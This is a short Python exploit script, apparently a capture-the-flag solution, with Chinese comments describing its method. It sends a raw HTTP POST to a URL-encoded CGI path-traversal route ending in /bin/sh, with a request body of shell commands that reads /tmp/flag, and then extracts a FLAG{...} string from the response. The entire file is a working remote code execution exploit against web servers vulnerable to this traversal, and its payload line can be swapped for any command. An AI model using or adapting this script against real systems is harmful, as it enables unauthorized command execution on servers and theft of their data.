import socket
import sys
import re

'''
@文件命名：X-031-24
@使用方式: python X-031-24.py url
@简述思路: 通过 CGI 路径穿越触发 /bin/sh 执行，直接 cat /tmp/flag。
'''


def Scan(url):
    target = url.split('://', 1)[-1]
    target = target.split('/', 1)[0]
    host, port = target.split(':')
    port = int(port)
    path = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
    payload = b'echo Content-Type: text/plain; echo; cat /tmp/flag'

    s = socket.socket()
    s.connect((host, port))
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: exp\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + payload
    s.sendall(req)

    res = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        res += chunk
    s.close()

    text = res.decode(errors='ignore')
    m = re.search(r"FLAG\{[^}]+\}", text)
    return m.group(0) if m else text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
